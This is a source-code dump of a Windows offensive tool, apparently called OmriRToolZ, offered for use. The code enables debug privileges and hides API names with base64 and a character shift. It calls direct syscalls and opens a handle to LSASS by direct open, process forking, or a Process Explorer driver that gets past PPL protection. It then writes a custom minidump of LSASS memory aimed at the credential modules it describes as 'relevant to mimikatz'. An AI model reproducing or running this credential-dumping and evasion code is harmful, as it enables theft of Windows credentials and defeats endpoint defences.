Project Path: arc_gmh5225_RToolZ_5efjgg86

Source Tree:

```txt
arc_gmh5225_RToolZ_5efjgg86
├── OmriRToolZ
│   ├── CPP_helpers.cpp
│   ├── CPP_helpers.h
│   ├── OmriRToolZ.c
│   ├── OmriRToolZ.vcxproj
│   ├── OmriRToolZ.vcxproj.filters
│   ├── OmriRToolZ.vcxproj.user
│   ├── Resource.rc
│   ├── SysCallsFinder.cpp
│   ├── SysCallsFinder.h
│   ├── asm.asm
│   ├── include
│   │   ├── nanodump.h
│   │   └── syscalls.h
│   ├── ppl_bypass_driver.cpp
│   ├── ppl_bypass_driver.h
│   └── resource.h
├── OmriRToolZ.sln
├── PROCEXP152.SYS
├── README.md
├── icon.ico
├── procexp64.exe
└── restore_signature.sh

```

`OmriRToolZ.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.4.33213.308
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "OmriRToolZ", "OmriRToolZ\OmriRToolZ.vcxproj", "{3E806623-DBD3-467B-A344-05D03C412D15}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Debug|x86 = Debug|x86
		Release|x64 = Release|x64
		Release|x86 = Release|x86
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{3E806623-DBD3-467B-A344-05D03C412D15}.Debug|x64.ActiveCfg = Debug|x64
		{3E806623-DBD3-467B-A344-05D03C412D15}.Debug|x64.Build.0 = Debug|x64
		{3E806623-DBD3-467B-A344-05D03C412D15}.Debug|x86.ActiveCfg = Debug|Win32
		{3E806623-DBD3-467B-A344-05D03C412D15}.Debug|x86.Build.0 = Debug|Win32
		{3E806623-DBD3-467B-A344-05D03C412D15}.Release|x64.ActiveCfg = Release|x64
		{3E806623-DBD3-467B-A344-05D03C412D15}.Release|x64.Build.0 = Release|x64
		{3E806623-DBD3-467B-A344-05D03C412D15}.Release|x86.ActiveCfg = Release|Win32
		{3E806623-DBD3-467B-A344-05D03C412D15}.Release|x86.Build.0 = Release|Win32
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {17E20C6C-5A40-44DD-ADE8-BB1BD6994B94}
	EndGlobalSection
EndGlobal

```

`OmriRToolZ/CPP_helpers.cpp`:

```cpp
#include "CPP_helpers.h"
#include <iostream>
#include <vector>
#include <map>
#include <stdio.h>

typedef BOOL(*_AdjustTokenPrivileges)(
	HANDLE            TokenHandle,
	BOOL              DisableAllPrivileges,
	PTOKEN_PRIVILEGES NewState,
	DWORD             BufferLength,
	PTOKEN_PRIVILEGES PreviousState,
	PDWORD            ReturnLength
	);

typedef BOOL(*_LookupPrivilegeValueW)(
	LPCWSTR lpSystemName,
	LPCWSTR lpName,
	PLUID   lpLuid
	);


typedef BOOL (*_TerminateProcess)(
 HANDLE hProcess,
 UINT   uExitCode
);

typedef struct _LDR_DATA_TABLE_ENTRY
{
	LIST_ENTRY InLoadOrderLinks;
	LIST_ENTRY InMemoryOrderLinks;
	LIST_ENTRY InInitializationOrderLinks;
	PVOID DllBase;
	PVOID EntryPoint;
	DWORD SizeOfImage;
	UNICODE_STRING FullDllName;
	UNICODE_STRING BaseDllName;
	DWORD Flags;
	WORD LoadCount;
	WORD TlsIndex;
	LIST_ENTRY HashLinks;
	PVOID SectionPointer;
	DWORD CheckSum;
	DWORD TimeDateStamp;
	PVOID LoadedImports;
	PVOID EntryPointActivationContext;
	PVOID PatchInformation;
}LDR_DATA_TABLE_ENTRY, * PLDR_DATA_TABLE_ENTRY;

__forceinline DWORD CompareStrings(const char* StringA, const wchar_t* StringB)
{
	const char* szIterA = StringA; const wchar_t* szIterB = StringB;

	while (*szIterA) {
		if (*szIterA++ != *szIterB++)
			return 1;
	}

	return *szIterB;
}

void* GetModuleFromPEB(const wchar_t* wModuleName)
{
#if defined( _WIN64 )  
#define PEBOffset 0x60  
#define LdrOffset 0x18  
#define ListOffset 0x10  
	unsigned long long pPeb = __readgsqword(PEBOffset); // read from the GS register
#elif defined( _WIN32 )  
#define PEBOffset 0x30  
#define LdrOffset 0x0C  
#define ListOffset 0x0C  
	unsigned long pPeb = __readfsdword(PEBOffset);
#endif       
	pPeb = *reinterpret_cast<decltype(pPeb)*>(pPeb + LdrOffset);
	PLDR_DATA_TABLE_ENTRY pModuleList = *reinterpret_cast<PLDR_DATA_TABLE_ENTRY*>(pPeb + ListOffset);
	while (pModuleList->DllBase)
	{
		if (!wcscmp(pModuleList->BaseDllName.Buffer, wModuleName)) // Compare the dll name that we are looking for against the dll we are inspecting right now.
			return pModuleList->DllBase; // If found, return back the void* pointer
		pModuleList = reinterpret_cast<PLDR_DATA_TABLE_ENTRY>(pModuleList->InLoadOrderLinks.Flink);
	}
	return nullptr;
}

uintptr_t GetAPIFromPEBModule(void* hModule, const wchar_t* wAPIName)
{
#if defined( _WIN32 )   
	unsigned char* lpBase = reinterpret_cast<unsigned char*>(hModule);
	IMAGE_DOS_HEADER* idhDosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(lpBase);
	if (idhDosHeader->e_magic == 0x5A4D)
	{
#if defined( _M_IX86 )  
		IMAGE_NT_HEADERS32* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS32*>(lpBase + idhDosHeader->e_lfanew);
#elif defined( _M_AMD64 )  
		IMAGE_NT_HEADERS64* inhNtHeader = reinterpret_cast<IMAGE_NT_HEADERS64*>(lpBase + idhDosHeader->e_lfanew);
#endif  
		if (inhNtHeader->Signature == 0x4550)
		{
			IMAGE_EXPORT_DIRECTORY* iedExportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(lpBase + inhNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
			for (register unsigned int uiIter = 0; uiIter < iedExportDirectory->NumberOfNames; ++uiIter)
			{
				char* szNames = reinterpret_cast<char*>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfNames)[uiIter]);
				if (!CompareStrings(szNames, wAPIName))
				{
					unsigned short usOrdinal = reinterpret_cast<unsigned short*>(lpBase + iedExportDirectory->AddressOfNameOrdinals)[uiIter];
					return reinterpret_cast<uintptr_t>(lpBase + reinterpret_cast<unsigned long*>(lpBase + iedExportDirectory->AddressOfFunctions)[usOrdinal]);
				}
			}
		}
	}
#endif  
	return 0;
}


static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

std::wstring base64_decode(const std::wstring& in) {

	std::wstring out;

	std::vector<int> T(256, -1);
	for (int i = 0; i < 64; i++) T["ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;

	int val = 0, valb = -8;
	for (unsigned char c : in) {
		if (T[c] == -1) break;
		val = (val << 6) + T[c];
		valb += 6;
		if (valb >= 0) {
			out.push_back(char((val >> valb) & 0xFF));
			valb -= 8;
		}
	}
	return out;
}


std::wstring decrypt(std::wstring text_real = L"") {


	std::wstring dec_out;
	text_real = base64_decode(text_real);
	int i;
	for (i = 0; (i < text_real.size() && text_real[i] != '\0'); i++) {
		text_real[i] = (text_real[i] - 2);

	};
	dec_out = text_real;

	return dec_out;

}

EXTERN_C HANDLE open_driver();
EXTERN_C HANDLE open_handle(ULONGLONG processPid, HANDLE hProcExpDevice);

 HANDLE GetLsassHandle(DWORD lssass_pid, DWORD Method) {

	 HANDLE lsassHandle = 0;
	 HANDLE CurrentSnapshotProcess;

	 _TerminateProcess hTerminate = (_TerminateProcess)GetAPIFromPEBModule(GetModuleFromPEB(decrypt(L"TUdUUEdONTQwRk5O").c_str()), decrypt(L"Vmd0b2twY3ZnUnRxZWd1dQ==").c_str());


	 NTSTATUS status = 0;

	 //CreateProcessEx

	 // Normally get an LSASS Handle - without any tricks, only direct syscall



		 if (Method == 2) {

			 OBJECT_ATTRIBUTES ObjectAttributes;
			 InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
			 CLIENT_ID uPid = { 0 };

			 uPid.UniqueProcess = (HANDLE)lssass_pid;
			 uPid.UniqueThread = 0;


			 CurrentSnapshotProcess = NULL;

			 status = _NtOpenProcess(&lsassHandle, PROCESS_CREATE_PROCESS, &ObjectAttributes, &uPid);
			 if (status) {

				 printf("failed with error 0x%x\n", status);

				 return FALSE;

			 }
			 else
				 printf("OMG Amazing!\n");

			 BOOL cleanSuccess;

			 cleanSuccess = TRUE;

			 if (CurrentSnapshotProcess)
			 {
				 cleanSuccess = hTerminate(CurrentSnapshotProcess, 0);
				 CloseHandle(CurrentSnapshotProcess);
				 if (cleanSuccess == FALSE)
				 {
					 return FALSE;
				 }

				 CurrentSnapshotProcess = NULL;
			 }


			 status = _NtCreateProcessEx(&CurrentSnapshotProcess, PROCESS_ALL_ACCESS, NULL, lsassHandle, 0, NULL, NULL, NULL, 0);

			 if (status) {

				 printf("failed with error 0x%x at stage 2\n", status);

				 return FALSE;
			 }
			 else
				 printf("Jackpot!\n");

			 return CurrentSnapshotProcess;

		 }



		 else if (Method == 1) {

			 OBJECT_ATTRIBUTES ObjectAttributes;
			 InitializeObjectAttributes(&ObjectAttributes, NULL, 0, NULL, NULL);
			 CLIENT_ID uPid = { 0 };

			 uPid.UniqueProcess = (HANDLE)lssass_pid;
			 uPid.UniqueThread = 0;

			 status = _NtOpenProcess(&lsassHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, &ObjectAttributes, &uPid);
			 if (!status) {

				 wprintf(L"OMG amazing!!\n");
				 return lsassHandle;

			 }
		 }


		 else if (Method == 3) {

			 printf("[+] Trying driver mode handle\n");

			 HANDLE hProcExpDevice = open_driver();
			 lsassHandle = open_handle(lssass_pid, hProcExpDevice);
			 if (lsassHandle) {

				 printf("[+] omg got ppl handle!\n");
				 return lsassHandle;

			 }

		 }

		 else {

			 wprintf(L"[!] Failed  - Ask Omri. error 0x%x\n", status);
			 return 0;

		 }


	 printf("[-] Unable to obtain lsass handle");

}

 BOOL SetDebugPrivilege() {
	 HANDLE hToken = NULL;
	 PHANDLE tokloc = &hToken;
	 TOKEN_PRIVILEGES TokenPrivileges = { 0 };
	 NTSTATUS status;

	 _LookupPrivilegeValueW LookupPrivilegeValueW_F = (_LookupPrivilegeValueW)GetAPIFromPEBModule(GetModuleFromPEB(decrypt(L"Q0ZYQ1JLNTQwZm5u").c_str()), decrypt(L"TnFxbXdyUnRreGtuZ2lnWGNud2dZ").c_str());
	 _AdjustTokenPrivileges AdjustTokenPrivileges_F = (_AdjustTokenPrivileges)GetAPIFromPEBModule(GetModuleFromPEB(decrypt(L"Q0ZYQ1JLNTQwZm5u").c_str()), decrypt(L"Q2Zsd3V2VnFtZ3BSdGt4a25naWd1").c_str());
	 status = _NtOpenProcessToken((HANDLE)0xffffffffffffffff, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, tokloc);
	 if (status) {
		 printf("1, ERROR 0x%x\n", status);
		 return FALSE;
	 }

	 TokenPrivileges.PrivilegeCount = 1;
	 TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	 LPWSTR lpwPriv = (LPWSTR)L"SeDebugPrivilege";
	 if (!LookupPrivilegeValueW_F(NULL, lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		 std::cout << "2 failed\n";
		 CloseHandle(hToken);
		 return FALSE;
	 }

	 if (!AdjustTokenPrivileges_F(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		 std::cout << "3 failed\n";
		 CloseHandle(hToken);
		 return FALSE;
	 }

	 CloseHandle(hToken);

	// std::cout << "ALL GOOD got privs\n";
	 return TRUE;
 }



```

`OmriRToolZ/CPP_helpers.h`:

```h
#pragma once
#include "include/syscalls.h"

EXTERN_C HANDLE GetLsassHandle(DWORD lssass_pid, DWORD Method);

EXTERN_C BOOL SetDebugPrivilege();

EXTERN_C DWORD GetBuild();

```

`OmriRToolZ/OmriRToolZ.c`:

```c
#include <Windows.h>
#include <stdio.h>
#include <time.h>
#include "CPP_helpers.h"
#define OBJ_CASE_INSENSITIVE                0x00000040L
#define FILE_OVERWRITE_IF               0x00000005
#define FILE_SYNCHRONOUS_IO_NONALERT            0x00000020
#include "include/syscalls.h"
#include "include/nanodump.h"
//#include "../ppl_bypass_driver.h"


//HANDLE hProcExpDevice = open_driver();



void writeat(struct dump_context* dc, ULONG32 rva, const void* data, unsigned size)
{
    void* dst = (void*)((ULONG_PTR)dc->BaseAddress + rva);
    besomemcpy_fast(dst, data, size);
}

void append(
    struct dump_context* dc,
    const void* data,
    unsigned size
)
{
    if (dc->rva + size > DUMP_MAX_SIZE)
    {
        printf("Increase MAX_SIZE.\n");

    }
    else
    {
        writeat(dc, dc->rva, data, size);
        dc->rva += size;
    }
}

BOOL write_file(
    char fileName[],
    char fileData[],
    ULONG32 fileLength
)
{
    HANDLE hFile;
    OBJECT_ATTRIBUTES objAttr;
    IO_STATUS_BLOCK IoStatusBlock;
    LARGE_INTEGER largeInteger;
    largeInteger.QuadPart = fileLength;
    wchar_t wcFilePath[MAX_PATH];
    wchar_t wcFileName[MAX_PATH];
    PUNICODE_STRING pUnicodeFilePath = (PUNICODE_STRING)intAlloc(sizeof(UNICODE_STRING));
    if (!pUnicodeFilePath)
    {

        printf("Failed to call Alloc for 0x%x bytes, error: %ld\n", (ULONG32)sizeof(UNICODE_STRING), KERNEL32$GetLastError());
        return FALSE;
    }

    // create a UNICODE_STRING with the file path
    MSVCRT$mbstowcs(wcFileName, fileName, MAX_PATH);
    MSVCRT$wcscpy(wcFilePath, L"\\??\\");
    MSVCRT$wcsncat(wcFilePath, wcFileName, MAX_PATH);
    pUnicodeFilePath->Buffer = wcFilePath;
    pUnicodeFilePath->Length = MSVCRT$wcsnlen(pUnicodeFilePath->Buffer, MAX_PATH);
    pUnicodeFilePath->Length *= 2;
    pUnicodeFilePath->MaximumLength = pUnicodeFilePath->Length + 2;

    // init the object attributes
    InitializeObjectAttributes(
        &objAttr,
        pUnicodeFilePath,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );
    // create the file
    NTSTATUS status = _NtCreateFile(
        &hFile,
        FILE_GENERIC_READ | FILE_GENERIC_WRITE | SYNCHRONIZE,
        &objAttr,
        &IoStatusBlock,
        &largeInteger,
        FILE_ATTRIBUTE_NORMAL,
        0,
        FILE_OVERWRITE_IF, //OMRI
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );
    intFree(pUnicodeFilePath); pUnicodeFilePath = NULL;
    if (status == STATUS_OBJECT_PATH_NOT_FOUND)
    {
        printf("The path '%s' is invalid.\n", fileName);
        return FALSE;
    }
    if (!NT_SUCCESS(status))
    {
        printf("Failed to make file, status: 0x%lx\n", status);
        return FALSE;
    }
    // write the dump
    status = _NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &IoStatusBlock,
        fileData,
        fileLength,
        NULL,
        NULL
    );
    _NtClose(hFile); hFile = NULL;
    if (!NT_SUCCESS(status))
    {

        return FALSE;
    }

    return TRUE;
}


ULONG32 convert_to_little_endian(
    ULONG32 number
)
{
    return ((number & 0xff000000) >> 3 * 8) | ((number & 0x00ff0000) >> 8) | ((number & 0x0000ff00) << 8) | ((number & 0x000000ff) << 3 * 8);
}

void write_header(
    struct dump_context* dc
)
{
    struct MiniDumpHeader header;
    // the signature might or might not be valid
    header.Signature = convert_to_little_endian(
        *(ULONG32*)(dc->signature)
    );
    header.Version = 42899;
    header.ImplementationVersion = 0;
    header.NumberOfStreams = 3; // we only need: SystemInfoStream, ModuleListStream and Memory64ListStream
    header.StreamDirectoryRva = 32;
    header.CheckSum = 0;
    header.Reserved = 0;
    header.TimeDateStamp = 0;
    header.Flags = 0; // MiniDumpNormal

    char header_bytes[32];
    int offset = 0;
    besomemcpy_fast(header_bytes + offset, &header.Signature, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.Version, 2); offset += 2;
    besomemcpy_fast(header_bytes + offset, &header.ImplementationVersion, 2); offset += 2;
    besomemcpy_fast(header_bytes + offset, &header.NumberOfStreams, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.StreamDirectoryRva, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.CheckSum, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.Reserved, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.TimeDateStamp, 4); offset += 4;
    besomemcpy_fast(header_bytes + offset, &header.Flags, 4);
    append(dc, header_bytes, 32);
}

void write_directory(struct dump_context* dc, struct MiniDumpDirectory directory)
{
    byte directory_bytes[12];
    int offset = 0;
    besomemcpy_fast(directory_bytes + offset, &directory.StreamType, 4); offset += 4;
    besomemcpy_fast(directory_bytes + offset, &directory.DataSize, 4); offset += 4;
    besomemcpy_fast(directory_bytes + offset, &directory.Rva, 4);
    append(dc, directory_bytes, sizeof(directory_bytes));
}

void write_directories(
    struct dump_context* dc
)
{
    struct MiniDumpDirectory system_info_directory;
    system_info_directory.StreamType = 7; // SystemInfoStream
    system_info_directory.DataSize = 0; // this is calculated and written later
    system_info_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, system_info_directory);

    struct MiniDumpDirectory module_list_directory;
    module_list_directory.StreamType = 4; // ModuleListStream
    module_list_directory.DataSize = 0; // this is calculated and written later
    module_list_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, module_list_directory);

    struct MiniDumpDirectory memory64_list_directory;
    memory64_list_directory.StreamType = 9; // Memory64ListStream
    memory64_list_directory.DataSize = 0; // this is calculated and written later
    memory64_list_directory.Rva = 0; // this is calculated and written later
    write_directory(dc, memory64_list_directory);
}

BOOL write_system_info_stream(
    struct dump_context* dc
)
{
    struct MiniDumpSystemInfo system_info;

    // read the version and build numbers from the PEB
    void* pPeb;
    ULONG32* OSMajorVersion;
    ULONG32* OSMinorVersion;
    USHORT* OSBuildNumber;
    ULONG32* OSPlatformId;
    UNICODE_STRING* CSDVersion;
    pPeb = (void*)READ_MEMLOC(PEB_OFFSET);

#if _WIN64
    OSMajorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x118);
    OSMinorVersion = (ULONG32*)(((ULONG64)(pPeb)) + 0x11c);
    OSBuildNumber = (USHORT*)(((ULONG64)(pPeb)) + 0x120);
    OSPlatformId = (ULONG32*)(((ULONG64)(pPeb)) + 0x124);
    CSDVersion = (UNICODE_STRING*)(((ULONG64)(pPeb)) + 0x2e8);
    system_info.ProcessorArchitecture = 9; // AMD64
#else
    OSMajorVersion = (ULONG32*)(((ULONG32)(pPeb)) + 0xa4);
    OSMinorVersion = (ULONG32*)(((ULONG32)(pPeb)) + 0xa8);
    OSBuildNumber = (USHORT*)(((ULONG32)(pPeb)) + 0xac);
    OSPlatformId = (ULONG32*)(((ULONG32)(pPeb)) + 0xb0);
    CSDVersion = (UNICODE_STRING*)(((ULONG32)(pPeb)) + 0x1f0);
    system_info.ProcessorArchitecture = 0; // INTEL
#endif

    system_info.ProcessorLevel = 0;
    system_info.ProcessorRevision = 0;
    system_info.NumberOfProcessors = 0;
    // NTDLL$RtlGetVersion -> wProductType
    system_info.ProductType = VER_NT_WORKSTATION;
    //system_info.ProductType = VER_NT_DOMAIN_CONTROLLER;
    //system_info.ProductType = VER_NT_SERVER;
    system_info.MajorVersion = *OSMajorVersion;
    system_info.MinorVersion = *OSMinorVersion;
    system_info.BuildNumber = *OSBuildNumber;
    system_info.PlatformId = *OSPlatformId;
    system_info.CSDVersionRva = 0; // this is calculated and written later
    system_info.SuiteMask = 0;
    system_info.Reserved2 = 0;
#if _WIN64
    system_info.ProcessorFeatures1 = 0;
    system_info.ProcessorFeatures2 = 0;
#else
    system_info.VendorId1 = 0;
    system_info.VendorId2 = 0;
    system_info.VendorId3 = 0;
    system_info.VersionInformation = 0;
    system_info.FeatureInformation = 0;
    system_info.AMDExtendedCpuFeatures = 0;
#endif

#if _WIN64
    ULONG32 stream_size = 48;
    char system_info_bytes[48];
#else
    ULONG32 stream_size = 56;
    char system_info_bytes[56];
#endif

    int offset = 0;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorArchitecture, 2); offset += 2;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorLevel, 2); offset += 2;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorRevision, 2); offset += 2;
    besomemcpy_fast(system_info_bytes + offset, &system_info.NumberOfProcessors, 1); offset += 1;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProductType, 1); offset += 1;
    besomemcpy_fast(system_info_bytes + offset, &system_info.MajorVersion, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.MinorVersion, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.BuildNumber, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.PlatformId, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.CSDVersionRva, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.SuiteMask, 2); offset += 2;
    besomemcpy_fast(system_info_bytes + offset, &system_info.Reserved2, 2); offset += 2;
#if _WIN64
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorFeatures1, 8); offset += 8;
    besomemcpy_fast(system_info_bytes + offset, &system_info.ProcessorFeatures2, 8); offset += 8;
#else
    besomemcpy_fast(system_info_bytes + offset, &system_info.VendorId1, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.VendorId2, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.VendorId3, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.VersionInformation, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.FeatureInformation, 4); offset += 4;
    besomemcpy_fast(system_info_bytes + offset, &system_info.AMDExtendedCpuFeatures, 4); offset += 4;
#endif

    ULONG32 stream_rva = dc->rva;
    append(dc, system_info_bytes, stream_size);

    // write our length in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 4, &stream_size, 4); // header + streamType

    // write our RVA in the MiniDumpSystemInfo directory
    writeat(dc, 32 + 4 + 4, &stream_rva, 4); // header + streamType + Location.DataSize

    // write the service pack
    ULONG32 sp_rva = dc->rva;
    ULONG32 Length = CSDVersion->Length;
    // write the length
    append(dc, &Length, 4);
    // write the service pack name
    append(dc, CSDVersion->Buffer, CSDVersion->Length);
    // write the service pack RVA in the SystemInfoStream
    writeat(dc, stream_rva + 24, &sp_rva, 4); // addrof CSDVersionRva

    return TRUE;
}
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION;


PVOID get_peb_address(
    HANDLE hProcess
)
{
    PROCESS_BASIC_INFORMATION basic_info;
    PROCESSINFOCLASS ProcessInformationClass = 0;
    NTSTATUS status = _NtQueryInformationProcess(
        hProcess,
        ProcessInformationClass,
        &basic_info,
        sizeof(PROCESS_BASIC_INFORMATION),
        NULL
    );
    if (!NT_SUCCESS(status))
    {

        return 0;
    }

    return basic_info.PebBaseAddress;
}

struct module_info* find_modules(
    HANDLE hProcess,
    wchar_t* important_modules[],
    int number_of_important_modules,
    BOOL is_lsass
)
{
    // module list
    struct module_info* module_list = NULL;
    BOOL lsasrv_found = FALSE;
    SHORT pointer_size;
    PVOID peb_address, ldr_pointer, ldr_address, module_list_pointer, ldr_entry_address, first_ldr_entry_address;

    peb_address = get_peb_address(hProcess);
    if (!peb_address)
        return NULL;

#if _WIN64
    pointer_size = 8;
    ldr_pointer = (char*)peb_address + 0x18;
#else
    pointer_size = 4;
    ldr_pointer = peb_address + 0xc;
#endif

    NTSTATUS status = _NtReadVirtualMemory(
        hProcess,
        (PVOID)ldr_pointer,
        &ldr_address,
        pointer_size,
        NULL
    );
    if (status == STATUS_PARTIAL_COPY && !is_lsass)
    {
        // failed to read the memory of some process, simply continue
        return NULL;
    }
    if (!NT_SUCCESS(status))
    {

        return NULL;
    }

#if _WIN64
    module_list_pointer = (char*)ldr_address + 0x20;
#else
    module_list_pointer = ldr_address + 0x14;
#endif

    status = _NtReadVirtualMemory(
        hProcess,
        (PVOID)module_list_pointer,
        &ldr_entry_address,
        pointer_size,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
        return NULL;
    }

    first_ldr_entry_address = ldr_entry_address;
    SHORT dlls_found = 0;
    struct LDR_DATA_TABLE_ENTRY ldr_entry;

    while (dlls_found < number_of_important_modules)
    {
        // read the entry
        status = _NtReadVirtualMemory(
            hProcess,
            ldr_entry_address,
            &ldr_entry,
            sizeof(struct LDR_DATA_TABLE_ENTRY),
            NULL
        );
        if (!NT_SUCCESS(status))
        {

            return NULL;
        }

        BOOL has_read_name = FALSE;
        wchar_t base_dll_name[256];
        // check if this dll is one of the dlls we are looking for
        for (int i = 0; i < number_of_important_modules; i++)
        {
            SHORT length = MSVCRT$wcsnlen(important_modules[i], 0xFF);

            // if the length of the name doesn't match, continue
            if (length * 2 != ldr_entry.BaseDllName.Length)
                continue;

            if (!has_read_name)
            {
                // initialize base_dll_name with all null-bytes
                //memset(base_dll_name, 0, sizeof(base_dll_name));
                besomemset_stosb(base_dll_name, 0, sizeof(base_dll_name));
                // read the dll name
                status = _NtReadVirtualMemory(
                    hProcess,
                    (PVOID)ldr_entry.BaseDllName.Buffer,
                    base_dll_name,
                    ldr_entry.BaseDllName.Length,
                    NULL
                );
                if (!NT_SUCCESS(status))
                {

                    return NULL;
                }
                has_read_name = TRUE;
            }

            // compare the DLL's name, case insensitive
            if (!MSVCRT$_wcsicmp(important_modules[i], base_dll_name))
            {
                // check if the DLL is 'lsasrv.dll' so that we know the process is LSASS

                lsasrv_found = TRUE;

                struct module_info* new_module = (struct module_info*)intAlloc(sizeof(struct module_info));
                if (!new_module)
                {

                    return NULL;
                }
                new_module->next = NULL;
                new_module->dll_base = (PVOID)ldr_entry.DllBase;
                new_module->size_of_image = ldr_entry.SizeOfImage;

                // read the full path of the DLL
                status = _NtReadVirtualMemory(
                    hProcess,
                    (PVOID)ldr_entry.FullDllName.Buffer,
                    new_module->dll_name,
                    ldr_entry.FullDllName.Length,
                    NULL
                );
                if (!NT_SUCCESS(status))
                {

                    return NULL;
                }
                if (!module_list)
                {
                    module_list = new_module;
                }
                else
                {
                    struct module_info* last_module = module_list;
                    while (last_module->next)
                        last_module = last_module->next;
                    last_module->next = new_module;
                }
                dlls_found++;
            }
        }

        // next entry
        ldr_entry_address = ldr_entry.InMemoryOrderLinks.Flink;
        // if we are back at the beginning, return
        if (ldr_entry_address == first_ldr_entry_address)
            break;
    }
    if (is_lsass && !lsasrv_found)
    {

        return NULL;
    }
    return module_list;
}

struct module_info* write_module_list_stream(
    struct dump_context* dc
)
{
    // list of modules relevant to mimikatz
    wchar_t* important_modules[] = {
        L"lsasrv.dll", L"msv1_0.dll", L"tspkg.dll", L"wdigest.dll", L"kerberos.dll",
        L"livessp.dll", L"dpapisrv.dll", L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll",
        L"samsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll", L"eventlog.dll",
        L"wevtsvc.dll", L"termsrv.dll", L"cloudap.dll"
    };
    struct module_info* module_list = find_modules(
        dc->hProcess,
        important_modules,
        ARRAY_SIZE(important_modules),
        TRUE
    );
    if (module_list == NULL)
        return NULL;

    // write the full path of each dll
    struct module_info* curr_module = module_list;
    ULONG32 number_of_modules = 0;
    while (curr_module)
    {
        number_of_modules++;
        curr_module->name_rva = dc->rva;
        ULONG32 full_name_length = MSVCRT$wcsnlen((wchar_t*)&curr_module->dll_name, sizeof(curr_module->dll_name));
        full_name_length++; // account for the null byte at the end
        full_name_length *= 2;
        // write the length of the name
        append(dc, &full_name_length, 4);
        // write the path
        append(dc, curr_module->dll_name, full_name_length);
        curr_module = curr_module->next;
    }

    ULONG32 stream_rva = dc->rva;
    // write the number of modules
    append(dc, &number_of_modules, 4);
    byte module_bytes[108];
    curr_module = module_list;
    while (curr_module)
    {
        struct MiniDumpModule module;
        module.BaseOfImage = (ULONG_PTR)curr_module->dll_base;
        module.SizeOfImage = curr_module->size_of_image;
        module.CheckSum = 0;
        module.TimeDateStamp = 0;
        module.ModuleNameRva = curr_module->name_rva;
        module.VersionInfo.dwSignature = 0;
        module.VersionInfo.dwStrucVersion = 0;
        module.VersionInfo.dwFileVersionMS = 0;
        module.VersionInfo.dwFileVersionLS = 0;
        module.VersionInfo.dwProductVersionMS = 0;
        module.VersionInfo.dwProductVersionLS = 0;
        module.VersionInfo.dwFileFlagsMask = 0;
        module.VersionInfo.dwFileFlags = 0;
        module.VersionInfo.dwFileOS = 0;
        module.VersionInfo.dwFileType = 0;
        module.VersionInfo.dwFileSubtype = 0;
        module.VersionInfo.dwFileDateMS = 0;
        module.VersionInfo.dwFileDateLS = 0;
        module.CvRecord.DataSize = 0;
        module.CvRecord.rva = 0;
        module.MiscRecord.DataSize = 0;
        module.MiscRecord.rva = 0;
        module.Reserved0 = 0;
        module.Reserved0 = 0;

        int offset = 0;
        besomemcpy_fast(module_bytes + offset, &module.BaseOfImage, 8); offset += 8;
        besomemcpy_fast(module_bytes + offset, &module.SizeOfImage, 4); offset += 4;
